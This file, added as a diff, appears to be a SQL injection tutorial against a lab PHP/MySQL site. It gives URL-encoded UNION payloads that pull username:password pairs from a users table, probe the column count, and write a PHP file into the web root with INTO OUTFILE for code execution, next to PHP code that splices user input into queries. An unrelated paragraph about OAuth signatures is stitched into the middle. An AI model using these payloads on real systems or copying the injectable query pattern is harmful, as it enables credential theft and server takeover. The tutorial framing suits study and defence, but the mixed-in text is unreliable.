@@ -1,0 +1,142 @@
+1--> Injection [SELECT Statement]:
+-----------------------------------
+Injection into a SELECT Statement is the most common SQL Injection attack.
+
+A SELECT Statement is not a DML Statement but is used for Data Retrieval. This can be very powerful, as Injection into a SELECT Statements means potentially access to information in the database.
+
+And we all know databases have contain all sorts of interesting/sensitive information.
+
+SELECT Statement Example:
+-------------------------
+SELECT * FROM CATEGORY WHERE CATEGORY_ID = 1
+
+PHP Code Example:
+-----------------
+$result = mysql_query("SELECT * FROM CATEGORY WHERE CATEGORY_ID = $ID", “mydb”);
+
+In regards to Injection into SELECT Statements the User Input, the Point of Injection is usually after the WHERE clause and is a value(s) searched for in a specified column(s). 
+
+What does this mean in regards to SQL Injection? It means that we are unable to manipulate the Columns selected and the Table which they are selected from, because it isn't made up of user input. This means short of another SQL Statement joined onto the SELECT Statement
+
+UNION Statement Example:
+------------------------
+SELECT CATEGORY_ID, CATEGORY_NAME FROM CATEGORY WHERE CATEGORY_ID = '1' UNION SELECT SECTION_ID, SECTION_NAME FROM SECTION WHERE CATEGORY_CATEGORY_ID = '1'
+
+Note: The column data types and number of columns match (ID's are Integer, Names are Strings.) With a UNION Statement you are able to add onto an existing SELECT Statement. A UNION Statement can be used when injecting into a SELECT Query which does NOT already have a
+UNION Statement.
+
+MySQL UNION Syntax:
+-------------------
+SELECT ...
+UNION [ALL | DISTINCT] SELECT ...
+[UNION [ALL | DISTINCT] SELECT ...]
+
+UNION is used to combine the result from multiple SELECT statements into a single result set.
+
+The column names from the first SELECT statement are used as the column names for the results returned.
+Selected columns listed in corresponding positions of each SELECT statement should have the same data type. (For example, the first column selected by the first statement should have the same type as the first column selected by the other statements.)
+
+If the data types of corresponding SELECT columns do not match, the types and lengths of the columns in the UNION result take into account the values retrieved by all of the SELECT statements. For example, consider the following:
+
+mysql> SELECT REPEAT('a',1) UNION SELECT REPEAT('b',10);
+
+(In some earlier versions of MySQL, only the type and length from the first SELECT would have been used and the second row would have been truncated to a length of 1.)
+
+The SELECT statements are normal select statements, but with the following restrictions: 
+
+Only the last SELECT statement can use INTO OUTFILE. (However, the entire UNION result is written to the file.)
+
+HIGH_PRIORITY cannot be used with SELECT statements that are part of a UNION. If you specify it for the first SELECT, it has no effect. If you specify it for any subsequent SELECT statements, a syntax error results.
+
+The default behavior for UNION is that duplicate rows are removed from the result. The optional DISTINCT keyword has no effect other than the default because it also specifies duplicate-row removal. With the optional ALL keyword, duplicate-row removal does not occur and the result includes all matching rows from all the SELECT statements.
+
+To relate this back to the familiar domain of web pages and login screens, a mismatched signature is simply a bad login attempt. When we manage logins with our authentication system, we typically store the secret part of the credentials --(the password) by using the password hashing API to generate a unique one-way hash. When the user submits their user name and password through our login form, a hash is generated for the submitted password and compared to the one we stored earlier. So you see, we are already familiar with a less involved “signature creation process”. If the password isn’t encrypted with the same algorithm and salt, it won’t match and we won’t be able to authenticate the user--. Though I will readily admit, the OAuth process for creating these signatures is a lot more involved than hashing a password.
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+2--> Example:
+-------------
+CREATE TABLE `category` (
+`CATEGORY_ID` int(10) unsigned NOT NULL AUTO_INCREMENT,
+`CATEGORY_NAME` varchar(50) NOT NULL DEFAULT '',
+PRIMARY KEY (`CATEGORY_ID`)
+)
+$categorysql = "SELECT CATEGORY_NAME FROM CATEGORY WHERE CATEGORY_ID = '" . $categoryID . "'";
+echo '<B>' . 'SQL QUERY: ' . '</B>' . $categorysql . "<br />" . "<br />";
+$category = mysql_query($categorysql, $mysqlcon) or die(mysqlerror());
+
+CONCAT_WS() stands for Concatenate With Separator and is a special form of CONCAT(). The first argument is the separator for the rest of the arguments. The separator is added between the strings to be concatenated. The separator can be a string, as can the rest of the arguments. If the separator is NULL, the result is NULL.
+
+SELECT CONCAT_WS(':','Username','Password');
+
+Username:Password.
+
+URL (GET Request):
+------------------
+http://10.0.0.4/SQLInjection/CategoryInjection.php?ID=1'%20UNION%20SELECT%20CONCAT_WS(':', %20USER_NAME,%20PASSWORD)%20FROM%20USERS%20WHERE%20USER_ID%20=%20'1
+
+Here we use UNION to merge the result with the Users Table, because we don't sanitize the input or drop the quotes.
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+2--> Example2:
+Section Table:
+--------------
+CREATE TABLE `section` (
+`SECTION_ID` int(10) unsigned NOT NULL AUTO_INCREMENT, `SECTION_NAME` varchar(45) NOT NULL DEFAULT '', `SECTION_CODE` varchar(3) NOT NULL DEFAULT '', `CATEGORY_CATEGORY_ID` int(10) unsigned NOT NULL DEFAULT '0', PRIMARY KEY (`SECTION_ID`), KEY `FK_CATEGORY_CATEGORY_ID` (`CATEGORY_CATEGORY_ID`), CONSTRAINT `FK_CATEGORY_CATEGORY_ID` FOREIGN KEY (`CATEGORY_CATEGORY_ID`) REFERENCES `category` (`CATEGORY_ID`)
+);
+
+SQL Statement: $sectionsql = "SELECT * FROM SECTION WHERE SECTION_ID = '" . $sectionID . "'";
+
+URL (GET Request):
+------------------
+http://10.0.0.4/SQLInjection/SectionInjection.php?ID=1'%20UNION%20SELECT%201%20FROM %20USERS%20WHERE%20USER_ID%20=%20'1.
+
+The Result will Fail: because we have different number of columns in each side of UNION.
+
+URL (GET Request):
+------------------
+http://10.0.0.4/SQLInjection/SectionInjection.php?ID=1'%20UNION%20SELECT%201,%201,%201%20FROM%20USERS%20WHERE%20USER_ID%20=%20'1
+
+The Result will Fail: Same Above.
+
+URL (GET Request):
+------------------
+http://10.0.0.4/SQLInjection/SectionInjection.php?ID=1'%20UNION%20SELECT%201,%201,%201%20,%201%20FROM%20USERS%20WHERE%20USER_ID%20=%20'1
+
+The Result will Success: we have the same number of columns, and the condition will pass and execute, but the result of user will be 1 same as the number we used to determine the column.
+
+In most databases Integers will be cast to a String if the matching column in the SELECT statement of the UNION Query is a String. Some databases are stricter than others on column data types matching and casting between different types.
+
+http://10.0.0.4/SQLInjection/SectionInjection.php?ID=1'%20UNION%20SELECT%20'characterString', %20'characterString',%20'characterString', 20'characterString'%20FROM%20USERS%20WHERE%20USER_ID%20=%20'1
+
+The Result will success: but the same above the user result will be: characterString.
+
+This problem require to configure the server to match number will column name string.
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+SELECT Statement Injection – Remote Code Execution:
+---------------------------------------------------
+URL (GET Request):
+http://10.0.0.4/SQLInjection/SectionInjection.php?ID=1'UNION%20SELECT%201,%20'h4x0red', %201, %201%20 FROM %20USERS%20WHERE%20USER_ID%20=%20'4'
+%20 INTO %20OUTFILE %20'h4x.txts
+
+DEpending On user permissions: if the user can write to file then we can execute this query, if the user don't granted to write to file, the 
+result will Fail(Access Denied).
+
+GRANT ALL PRIVILEGES ON mydb.* FOR 'USERNAME' -- where the username is the name of mysql user.
+
+Of course in the real world granting ALL privileges to a user is asking for trouble if they do not need them.
+
+If a program needs to use a MySQL FILE Function then you can just GRANT them FILE permissions.
+
+PHP Code:
+---------
+<?php echo "<B>PHP Code Executed ...</B>"; ?>
+
+URL (GET Request with URL Encode for PHP Code):
+-----------------------------------------------
+http://10.0.0.4/SQLInjection/SectionInjection.php?ID=-666'%20UNION%20SELECT%201,%20'%3C?php%20echo%20%22%3CB%3EPHP%20Code%20Executed%20...%3C/B%3E%22;%20?%3E', %201, %201%20INTO%20OUTFILE%20'C://apache2triad//htdocs//h4x.php'%20FROM%20USERS%20WHERE%20USER_ID%20=%20'2
+
+h4x.php Contents:
+-----------------
+1
+<?php echo "<B>PHP Code Executed ...</B>"; ?>
+1
+1
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
